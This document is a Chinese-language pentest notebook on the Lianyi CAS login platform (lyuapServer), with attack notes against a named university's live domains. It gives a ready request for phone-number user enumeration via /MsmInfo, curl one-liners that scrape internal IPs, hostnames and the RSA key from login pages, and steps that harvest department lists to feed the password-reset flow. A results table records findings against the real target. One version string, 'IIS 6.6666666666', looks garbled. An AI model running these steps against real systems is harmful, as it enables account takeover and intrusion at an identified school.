# 联奕科技CAS (Lianyi CAS / lyuapServer) 测试模式 - 2026-06 xjjtxy.cn实测

## 概述
联奕科技(Lianyi Technology, 2004-2017)是国内高校CAS统一身份认证的主要供应商之一。
产品名: 统一身份认证管理平台, 路径前缀: lyuapServer, 管理后台: ly_web_casconsole

## 关键攻击向量

### 1. SMS登录用户枚举 (MsmInfo端点) - 中危
CAS登录页支持短信登录模式，`/lyuapServer/MsmInfo`接口返回不同状态码:

| 响应 | 含义 |
|------|------|
| 0 | 错误 |
| 1 | 成功(手机号已绑定) |
| 2 | 间隔过小(已发送，90秒内) |
| 3 | "手机号不存在或未绑定！" |

**调用方式** (需浏览器AJAX，带session cookie):
```
POST /lyuapServer/MsmInfo
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Body: phonenumber=13800138000&phonecode=<captcha_value>
```

**JS源码位置** (从登录页提取):
```javascript
// 状态 0 错误，1 成功 ，2 间隔过小，3 用户不存在
if(str=="3"){
    $("#msmerrors").html("手机号不存在或未绑定！");
}
```

**phonecode字段**: 短信登录验证码图片的值(不是短信验证码)，需先调用验证码接口获取。

### 2. CAS登录页源码敏感信息泄露 - 中危
`/lyuapServer/login` 页面JS中硬编码以下敏感信息:

**内网IP**:
- `https://172.16.31.150:20083/download` (校内即时通讯工具-内网版)

**内部域名**:
- `cas.leaf.com` (联奕CAS产品内部域名，非学校域名)
- `https://www.xjjtedu.cn:65083/download` (校内即时通讯工具-外网版)

**RSA公钥** (用于密码加密):
```
exponent: 010001
modulus: 00f0d1b6305ea6256c768f30b6a94ef6c9fa2ee0b8eea2ea5634f821925de774ac60e7cfe9d238489be12551b460ef7943fb0fc132fdfba35fd11a71e0b13d9fe4fed9af90eb69da8627fab28f9700ceb6747ef1e09d6b360553f5385bb8f6315a3c7f71fa0e491920fd18c8119e8ab97d96a06d618e945483d39d83e3a2cf2567
```

**提取命令**:
```bash
# 内网IP
curl -sk 'https://<target>/lyuapServer/login' | grep -oP 'https?://172\.16\.[^"]*'
# 内部域名
curl -sk 'https://<target>/lyuapServer/login' | grep -oP 'cas\.leaf\.com[^"]*'
# RSA公钥
curl -sk 'https://<target>/lyuapServer/login' | grep -oP "RSAKeyPair\(\"[^\"]*\""
# 校内通讯工具
curl -sk 'https://<target>/lyuapServer/login' | grep -oP 'href="https?://[^"]*download[^"]*"'
```

### 3. 学生密码找回页面暴露组织架构 - 低危
`/safe/findPassByOther.jsp` 页面包含完整学院/部门下拉列表:

```bash
# 提取部门列表
curl -sk 'https://<target>/safe/findPassByOther.jsp' | grep -oP '<option[^>]*>([^<]+)</option>' | head -40
```

**密码找回流程**:
1. `findPassByOther.jsp` - 输入账号+姓名+身份证+学院
2. `yanzhengma.jsp` - 获取验证码(可能返回明文)
3. `checkaccountmassage.jsp` - 验证账号信息
4. `checkquestionbinding.jsp` - 检查密保问题

**关键**: 学院名称是必填项，但可从页面下拉列表中获取所有选项。

### 4. BPM事务中心系统 (独立域名)
学校在独立域名(如xjjtxy.top)上部署BPM事务中心系统:
- 框架: Vue.js SPA + Java后端
- 认证: OAuth2 (client_id, scope存储在JS中)
- 依赖CAS: casLogoutUrl指向lyuapServer
- 关键JS变量: `window.gateway_version`, `window.iacp_version`, `window.tokenFormCookie`

```bash
# 检测BPM系统
curl -sk 'https://<bpm-domain>/Bpmui/' | grep -i 'casLogoutUrl\|gateway_version\|client_id'
# /api/bpm/ 返回302(需认证)或200(Vue SPA)
# /auth/ 返回500 Java异常(信息泄露)
```

## 关联目标发现模式
联奕CAS通常与以下系统共存:
- 主站: VSB博达站群 (www.<domain>.edu/com/cn)
- CAS: lyuapServer (<cas-domain>)
- BPM: 事务中心 (<bpm-domain>) - 可能是.top/.cn等不同TLD
- 校内通讯: 独立端口 (65083/20083)

## 已测试目标

| 目标 | CAS域名 | 发现 | 备注 |
|------|---------|------|------|
| xjjtedu.com | xjjtxy.cn | SMS用户枚举+源码信息泄露+Open Redirect+管理后台暴露+组织架构泄露 | Tomcat 7.0.109, IIS 6.6666666666 |
